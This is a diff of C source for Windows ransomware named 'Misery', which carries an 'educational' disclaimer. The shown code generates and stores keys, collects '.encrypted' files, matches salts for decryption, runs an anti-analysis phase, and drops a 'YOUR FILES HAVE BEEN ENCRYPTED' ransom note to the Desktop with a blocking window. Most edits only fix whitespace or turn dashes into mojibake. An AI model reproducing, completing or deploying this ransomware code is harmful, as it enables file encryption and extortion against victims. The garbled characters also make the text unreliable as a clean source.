@@ -2,7 +2,7 @@
 Kashmir
 CSE GRAD W/S in Cybersecurity
 Malware Researcher | Cybersecurity Engineer | Hacker
-Copyright © 2026. All Rights Reserved.
+Copyright Â© 2026. All Rights Reserved.
 
 This educational script and software is designed
 strictly for academic research and defensive analysis.
@@ -19,7 +19,7 @@ data loss, or illegal activity resulting from the execution of this code.
 Execution against non-consenting target systems is strictly illegal.*/
 
 /*God help whoever touches this piece of code next.
-It took me thousands of compilation errors 
+It took me thousands of compilation errors
 and countless nights and 600mg of caffiene every single day
 and i still dont know how did this even work*/
 
@@ -61,7 +61,7 @@ const char *g_target_dirs[] = {
 
 
  // Generate 32 cryptographically random bytes using CryptoAPI.
- 
+
 static void GenerateRawKey(BYTE *key, DWORD keySize) {
     HCRYPTPROV hProv = 0;
     if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
@@ -69,7 +69,7 @@ static void GenerateRawKey(BYTE *key, DWORD keySize) {
         CryptReleaseContext(hProv, 0);
         return;
     }
-    /* Extreme fallback – should never reach here on Windows */
+    /* Extreme fallback â€“ should never reach here on Windows */
     HCRYPTPROV hProv2 = 0;
     CryptAcquireContextA(&hProv2, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
     CryptGenRandom(hProv2, keySize, key);
@@ -79,7 +79,7 @@ static void GenerateRawKey(BYTE *key, DWORD keySize) {
 /*
  Save key file in clean hex format to a location OUTSIDE all
  target directories.
- 
+
   Format:
     <32 hex chars for salt>
     <64 hex chars for key>
@@ -182,15 +182,15 @@ static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
     return NULL;
 }
 
-/* 
+/*
   Recursive collector that finds ALL .encrypted files
   and extracts each file's embedded 16-byte salt.
- 
+
   Populates:
-    outFiles[]  – UTF-8 paths of .encrypted files found
-    outSalts[]  – 16-byte salt read from each file's header
-    outCount    – number of files collected (capped at maxCount)
- 
+    outFiles[]  â€“ UTF-8 paths of .encrypted files found
+    outSalts[]  â€“ 16-byte salt read from each file's header
+    outCount    â€“ number of files collected (capped at maxCount)
+
   Returns true if at least one file was found.
  */
 static bool CollectEncryptedFilesRecursive(const WCHAR *root,
@@ -253,15 +253,15 @@ static bool CollectEncryptedFilesRecursive(const WCHAR *root,
     return anyFound;
 }
 
-/* 
+/*
   Find an .encrypted file whose embedded salt MATCHES
   the provided keySalt.
- 
+
   When the user runs encryption multiple times, each run generates
   a new salt and overwrites misery.key. But old .encrypted files
   (from previous runs) retain their original salt. The decryptor
   must find a file whose salt matches the CURRENT key's salt.
- 
+
   Returns true and fills outPath/outSalt on match.
 */
 static bool FindEncryptedFileWithMatchingSalt(const BYTE *keySalt,
@@ -375,24 +375,24 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     }
 
     /* Derive the "key salt" from the raw key.
-     
+
       When encrypting, InitCryptoRaw(rawKey, ..., NULL) generates a
       random salt internally. The same raw key + the SAME salt always
       produces the same derived AES key and HMAC key.
-     
+
       The salt embedded in .encrypted files is whatever salt was
       generated during that specific encryption run. So to find which
       files belong to this key, we need to know what salt was used.
-     
+
       Since we only have the raw key (from GUI paste), we init crypto
-      with a NULL salt → it generates a NEW random salt. That won't
+      with a NULL salt â†’ it generates a NEW random salt. That won't
       match anything.
-     
+
       SOLUTION is Instead of trying to derive the salt from the key
       we collect ALL .encrypted files,
      read each file's salt, init crypto with rawKey + that salt,
       and test-decrypt. The file that passes HMAC is the match.
-   
+
      *approaach could be  Collect all unique salts from .encrypted
      files, try each one until HMAC verification passes.
      */
@@ -513,9 +513,9 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     }
 
     if (matchedIdx < 0) {
-        /* No file's salt matched — the key is genuinely wrong */
+        /* No file's salt matched â€” the key is genuinely wrong */
         MiseryLog(MISERY_LOG_ERROR,
-                  "Decrypt: KEY INCORRECT – tested %d file(s), none matched",
+                  "Decrypt: KEY INCORRECT â€“ tested %d file(s), none matched",
                   totalCount);
         CleanupCrypto();
         SecureZeroMemory(rawKey, sizeof(rawKey));
@@ -529,7 +529,7 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     /* Crypto context is already initialized with the matching salt.
      * Proceed to full decryption. */
 
-    /* Key is valid – run full decryption */
+    /* Key is valid â€“ run full decryption */
     FILEOPS_CONFIG cfg = {0};
     cfg.threadCount   = 8;
     cfg.ioBufferSize  = (64 * 1024);
@@ -563,7 +563,7 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     FILEOPS_STATS stats;
     FileOps_GetStats(fctx, &stats);
     MiseryLog(MISERY_LOG_INFO,
-              "Decrypt: Complete – %lld OK, %lld failed, %lld bytes",
+              "Decrypt: Complete â€“ %lld OK, %lld failed, %lld bytes",
               stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);
 
     FileOps_DestroyContext(fctx);
@@ -573,7 +573,7 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
 }
 
 
- // PHASE EXECUTIONS 
+ // PHASE EXECUTIONS
 
 static bool ExecutePhaseAntiAnalysis(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
@@ -683,8 +683,8 @@ static bool ExecutePhaseRansomNote(void) {
         "\n"
         "YOUR FILES HAVE BEEN ENCRYPTED\n"
         "\n"
-        \n"
-        \n";
+        "\n"
+        "\n";
 
     char desktop_path[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
@@ -693,7 +693,7 @@ static bool ExecutePhaseRansomNote(void) {
         UtilsDropRansomNote(note_path, note_content);
     }
 
-    /* Show GUI window – BLOCKING */
+    /* Show GUI window â€“ BLOCKING */
     ShowRansomNoteWindow();
 
     return MiseryPhaseTransition(PHASE_RANSOM_NOTE, true);
@@ -707,7 +707,7 @@ static bool ExecutePhaseCleanup(void) {
 
 
  // this is MAIN
- 
+
 int main(int argc, char **argv) {
     DWORD start_time = GetTickCount();
 
@@ -722,7 +722,7 @@ int main(int argc, char **argv) {
     bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
 
     if (decryptmode) {
-        
+
         MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
 
         char keyfilePath[MAX_PATH * 2] = {0};
@@ -783,7 +783,7 @@ int main(int argc, char **argv) {
                       "Decrypt: %lld files decrypted, %lld failed",
                       stats.filesSucceeded, stats.filesFailed);
         } else {
-            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed – wrong key or corrupt data");
+            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed â€“ wrong key or corrupt data");
         }
 
         CleanupCrypto();
@@ -792,9 +792,9 @@ int main(int argc, char **argv) {
         return 0;
     }
 
-   
+
      //ENCRYPT MODE
-   
+
     MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");
 
     /* Generate 32 cryptographically secure random bytes */
